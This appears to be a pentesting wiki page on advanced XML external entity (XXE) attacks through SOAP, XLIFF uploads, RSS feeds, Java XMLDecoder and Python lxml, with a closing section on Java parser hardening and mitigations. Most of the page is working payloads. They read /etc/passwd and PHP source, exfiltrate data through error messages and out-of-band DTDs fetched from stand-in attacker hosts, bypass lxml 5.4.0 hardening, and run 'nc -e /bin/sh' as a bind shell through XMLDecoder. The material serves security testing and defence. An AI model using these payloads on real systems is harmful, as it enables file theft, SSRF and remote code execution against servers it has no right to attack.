# XXE - Advanced Vectors (SOAP, RSS, Java) and Tools

## **SOAP - XEE**

```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```

## XLIFF - XXE

This example is inspired in [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) is utilized to standardize data exchange in localization processes. It's an XML-based format primarily used for transferring localizable data among tools during localization and as a common exchange format for CAT (Computer-Aided Translation) tools.

### Blind Request Analysis

A request is made to the server with the following content:

```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```

However, this request triggers an internal server error, specifically mentioning a problem with the markup declarations:

```json
{
  "status": 500,
  "error": "Internal Server Error",
  "message": "Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."
}
```

Despite the error, a hit is recorded on Burp Collaborator, indicating some level of interaction with the external entity.

Out of Band Data Exfiltration To exfiltrate data, a modified request is sent:

```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```

This approach reveals that the User Agent indicates the use of Java 1.8. A noted limitation with this version of Java is the inability to retrieve files containing a newline character, such as /etc/passwd, using the Out of Band technique.

Error-Based Data Exfiltration To overcome this limitation, an Error-Based approach is employed. The DTD file is structured as follows to trigger an error that includes data from a target file:

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```

The server responds with an error, importantly reflecting the non-existent file, indicating that the server is attempting to access the specified file:

```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```

To include the file's content in the error message, the DTD file is adjusted:

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```

This modification leads to the successful exfiltration of the file's content, as it is reflected in the error output sent via HTTP. This indicates a successful XXE (XML External Entity) attack, leveraging both Out of Band and Error-Based techniques to extract sensitive information.

## RSS - XEE

Valid XML with RSS format to exploit an XXE vulnerability.

### Ping back

Simple HTTP request to attackers server

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```

### Read file

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```

### Read source code

Using PHP base64 filter

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```

## Java XMLDecoder XEE to RCE

XMLDecoder is a Java class that creates objects based on a XML message. If a malicious user can get an application to use arbitrary data in a call to the method **readObject**, he will instantly gain code execution on the server.

### Using Runtime().exec()

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="6">
          <void index="0">
              <string>/usr/bin/nc</string>
          </void>
          <void index="1">
              <string>-l</string>
          </void>
          <void index="2">
              <string>-p</string>
          </void>
          <void index="3">
              <string>9999</string>
          </void>
          <void index="4">
              <string>-e</string>
          </void>
          <void index="5">
              <string>/bin/sh</string>
          </void>
      </array>
      </void>
 </object>
</java>
```

### ProcessBuilder

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="6">
      <void index="0">
        <string>/usr/bin/nc</string>
      </void>
      <void index="1">
         <string>-l</string>
      </void>
      <void index="2">
         <string>-p</string>
      </void>
      <void index="3">
         <string>9999</string>
      </void>
      <void index="4">
         <string>-e</string>
      </void>
      <void index="5">
         <string>/bin/sh</string>
      </void>
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```

## XXE + WrapWrap + Lightyear + bypasses

Take a look to this amazing report [https://swarm.ptsecurity.com/impossible-xxe-in-php/](https://swarm.ptsecurity.com/impossible-xxe-in-php/)

## Tools

### Python lxml Parameter-Entity XXE (Error-Based File Disclosure)

> [!INFO]
> The Python library **lxml** uses **libxml2** under the hood.  Versions prior to **lxml 5.4.0 / libxml2 2.13.8** still expand *parameter* entities even when `resolve_entities=False`, making them reachable when the application enables `load_dtd=True` and/or `resolve_entities=True`.  This allows Error-Based XXE payloads that embed the contents of local files into the parser error message.

#### 1. Exploiting lxml < 5.4.0
1. Identify or create a *local* DTD on disk that defines an **undefined** parameter entity (e.g. `%config_hex;`).
2. Craft an internal DTD that:
   * Loads the local DTD with `<!ENTITY % local_dtd SYSTEM "file:///tmp/xml/config.dtd">`.
   * Redefines the undefined entity so that it:
     - Reads the target file (`<!ENTITY % flag SYSTEM "file:///tmp/flag.txt">`).
     - Builds another parameter entity that refers to an **invalid path** containing the `%flag;` value and triggers a parser error (`<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///aaa/%flag;'>">`).
3. Finally expand `%local_dtd;` and `%eval;` so that the parser encounters `%error;`, fails to open `/aaa/<FLAG>` and leaks the flag inside the thrown exception – which is often returned to the user by the application.

```xml
<!DOCTYPE colors [
  <!ENTITY % local_dtd SYSTEM "file:///tmp/xml/config.dtd">
  <!ENTITY % config_hex '
    <!ENTITY % flag SYSTEM "file:///tmp/flag.txt">
    <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///aaa/%flag;'>">
  %eval;'>
  %local_dtd;
]>
```
When the application prints the exception the response contains:
```
Error : failed to load external entity "file:///aaa/FLAG{secret}"
```

> [!TIP]
> If the parser complains about `%`/`&` characters inside the internal subset, double-encode them (`&#x26;#x25;` ⇒ `%`) to delay expansion.

#### 2. Bypassing the lxml 5.4.0 hardening (libxml2 still vulnerable)
`lxml` ≥ 5.4.0 forbids *error* parameter entities like the one above, but **libxml2** still allows them to be embedded in a *general* entity.  The trick is to:
1. Read the file into a parameter entity `%file`.
2. Declare another parameter entity that builds a **general** entity `c` whose SYSTEM identifier uses a *non-existent protocol* such as `meow://%file;`.
3. Place `&c;` in the XML body.  When the parser tries to dereference `meow://…` it fails and reflects the full URI – including the file contents – in the error message.

```xml
<!DOCTYPE colors [
  <!ENTITY % a '
    <!ENTITY % file SYSTEM "file:///tmp/flag.txt">
    <!ENTITY % b "<!ENTITY c SYSTEM 'meow://%file;'>">
  '>
  %a; %b;
]>
<colors>&c;</colors>
```

#### Key takeaways
* **Parameter entities** are still expanded by libxml2 even when `resolve_entities` should block XXE.
* An **invalid URI** or **non-existent file** is enough to concatenate controlled data into the thrown exception.
* The technique works **without outbound connectivity**, making it ideal for strictly egress-filtered environments.

#### Mitigation guidance
* Upgrade to **lxml ≥ 5.4.0** and ensure the underlying **libxml2** is **≥ 2.13.8**.
* Disable `load_dtd` and/or `resolve_entities` unless absolutely required.
* Avoid returning raw parser errors to the client.

### Java DocumentBuilderFactory hardening example

Java applications frequently parse XML using `DocumentBuilderFactory`.  By default the factory **allows external entity resolution**, making it vulnerable to XXE and SSRF if no additional hardening flags are set:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = dbf.newDocumentBuilder(); // XXE-prone
```

Secure configuration example:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Completely forbid any DOCTYPE declarations (best-effort defence)
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Disable expansion of external entities
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Enable "secure processing" which applies additional limits
dbf.setFeature(javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING, true);

// Defensive extras
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

DocumentBuilder builder = dbf.newDocumentBuilder();
```

If the application must support DTDs internally, keep `disallow-doctype-decl` disabled but **always** leave the two `external-*-entities` features set to `false`.  The combination prevents classical file-disclosure payloads (`file:///etc/passwd`) as well as network-based SSRF vectors (`http://169.254.169.254/…`, `jar:` protocol, etc.).

Real-world case study: **CVE-2025-27136** in the Java S3 emulator *LocalS3* used the vulnerable constructor shown above.  An unauthenticated attacker could supply a crafted XML body to the `CreateBucketConfiguration` endpoint and have the server embed local files (for example `/etc/passwd`) in the HTTP response.

### XXE in JMF/Print Orchestration Services → SSRF

Some print workflow/orchestration platforms expose a network-facing Job Messaging Format (JMF) listener that accepts XML over TCP. If the underlying parser accepts a `DOCTYPE` and resolves external entities, you can leverage a classical XXE to force the server to make outbound requests (SSRF) or access local resources.

Key points observed in the wild:
- Network listener (e.g., JMF client) on a dedicated port (commonly 4004 in Xerox FreeFlow Core).
- Java-based XML parsing inside a jar (e.g., `jmfclient.jar`) without `disallow-doctype-decl` or entity resolution disabled.
- Out-of-band callbacks reliably confirm exploitation.

Minimal JMF-style SSRF probe (structure varies by product but the DOCTYPE is what matters):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE JMF [
  <!ENTITY probe SYSTEM "http://attacker-collab.example/oob">  
]>
<JMF SenderID="hacktricks" Version="1.3" TimeStamp="2025-08-13T10:10:10Z">
  <Query Type="KnownMessages">&probe;</Query>
</JMF>
```

Notes:
- Replace the entity URL with your collaborator. If SSRF is possible the server will resolve it while parsing the message.
- Hardenings to look for: `disallow-doctype-decl=true`, `external-general-entities=false`, `external-parameter-entities=false`.
- Even when the JMF port does not serve files, SSRF can be chained for internal recon or to reach management APIs bound to localhost.

References for this vector are listed at the end of the page.

## References

- [OffSec Blog – CVE-2025-27136 LocalS3 XXE](https://www.offsec.com/blog/cve-2025-27136/)

- [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)
- [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)
- Extract info via HTTP using own external DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)
- [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)
- [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)
- [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)
- [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

- [Dojo CTF Challenge #42 – Hex Color Palette XXE write-up](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-42)
- [lxml bug #2107279 – Parameter-entity XXE still possible](https://bugs.launchpad.net/lxml/+bug/2107279)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core XXE/SSRF + Path Traversal)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox FreeFlow Core Security Guide (architecture/ports)](https://securitydocs.business.xerox.com/wp-content/uploads/2025/03/Security-Guide-Information-Assurance-Disclosure-Xerox-FreeFlow-Core-8.0.pdf)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
